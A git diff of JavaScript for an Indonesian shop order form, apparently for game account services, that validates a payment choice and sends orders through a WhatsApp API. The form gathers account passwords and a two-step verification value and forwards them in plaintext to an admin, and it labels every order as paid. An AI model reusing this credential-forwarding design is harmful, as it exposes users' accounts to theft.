@@ -96,6 +96,7 @@ document.addEventListener("DOMContentLoaded", () => {
       selectedCard.appendChild(span);
     }
   }
+
   document.getElementById("akun-form").addEventListener("submit", (e) => {
     e.preventDefault();
     const form = e.target;
@@ -104,7 +105,9 @@ document.addEventListener("DOMContentLoaded", () => {
     inputs.forEach((input) => {
       if (!input.value || input.value.trim() === "") valid = false;
     });
-    if (!valid || !selectedItem) {
+
+    const metode = document.getElementById("metode-terpilih").value;
+    if (!valid || !selectedItem || !metode) {
       Swal.fire({
         title: "Ketua Harap isi semua kolom & pilih item 😁",
         icon: "warning",
@@ -121,17 +124,8 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     const data = Object.fromEntries(new FormData(form).entries());
-    const listItem = `- ${selectedItem.label} (${selectedItem.harga})`;
-    const message = `🔥 *Order Baru dari Website* 🔥
-👤 Nickname: ${data.nickname}
-📧 Email: ${data.email}
-🔐 Password: ${data.password}
-🔑 Login: ${data.loginMethod}
-📱 WhatsApp: ${data.whatsapp}
-🛒 Orderan:\n${listItem}
-🔒 V2L: ${data.v2l}
-💳 Pembayaran: ${data.metode}
-✅ Status: Pembayaran berhasil`;
+    const item = selectedItem;
+    const message = `🔥 *Order Baru dari Website* 🔥\n👤 Nickname: ${data.nickname}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}\n🔑 Login: ${data.loginMethod}\n📱 WhatsApp: ${data.whatsapp}\n🛒 Orderan:\n- ${item.label} (${item.harga})\n🔒 V2L: ${data.v2l}\n💳 Pembayaran: ${data.metode}\n✅ Status: Pembayaran berhasil`;
 
     fetch("https://api.fonnte.com/send", {
       method: "POST",
@@ -145,7 +139,7 @@ document.addEventListener("DOMContentLoaded", () => {
       }),
     })
       .then((res) => res.json())
-      .then((data) => {
+      .then(() => {
         Swal.fire({
           icon: "success",
           title: "Orderan kamu sudah dikirim ke admin ✅",
@@ -154,7 +148,7 @@ document.addEventListener("DOMContentLoaded", () => {
           confirmButtonText: "Oke Ketua",
         });
       })
-      .catch((err) => {
+      .catch(() => {
         Swal.fire({
           icon: "error",
           title: "Gagal mengirim ke WhatsApp 😢",
@@ -164,19 +158,9 @@ document.addEventListener("DOMContentLoaded", () => {
       });
   });
 
-  // Klik luar batal tapi hanya jika bukan login form / metode pembayaran
-  document.addEventListener("click", (e) => {
-    const isProduk = e.target.closest(".produk-item");
-    const isForm = e.target.closest("form");
-    const isMetode = e.target.closest(".payment-section");
-    if (!isProduk && !isForm && !isMetode && selectedItem) {
-      [...produkContainer.children].forEach((el) => el.classList.remove("selected"));
-      selectedItem = null;
-    }
-  });
+  // hilangkan event batal jika klik di luar
 });
 
-// Pembayaran
 function toggleCollapse(element) {
   const next = element.nextElementSibling;
   if (!next || !next.classList.contains("form-sub")) return;
@@ -186,7 +170,6 @@ function toggleCollapse(element) {
 function selectPayment(card, method) {
   const input = document.getElementById("metode-terpilih");
   const isSelected = card.classList.contains("selected");
-
   if (isSelected) {
     card.classList.remove("selected");
     input.value = "";
@@ -198,6 +181,7 @@ function selectPayment(card, method) {
     });
     card.classList.add("selected");
     input.value = method;
+
     const total = calculateTotalHarga(method);
     const span = document.createElement("div");
     span.className = "total-harga-text";
@@ -213,12 +197,14 @@ function removeTotalHarga(card) {
 }
 
 function calculateTotalHarga(method) {
-  if (!selectedItem) return 0;
-  const harga = parseInt(selectedItem.harga.replace(/[^\d]/g, ""));
+  let total = 0;
+  if (selectedItem) {
+    total += parseInt(selectedItem.harga.replace(/[^\d]/g, ""));
+  }
   const adminFee = ["Ovo", "GoPay", "ShopeePay", "QRIS"].includes(method) ? 1500 : 0;
-  return harga + adminFee;
+  return total + adminFee;
 }
 
 function formatRupiah(angka) {
   return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-                                                 }
+}
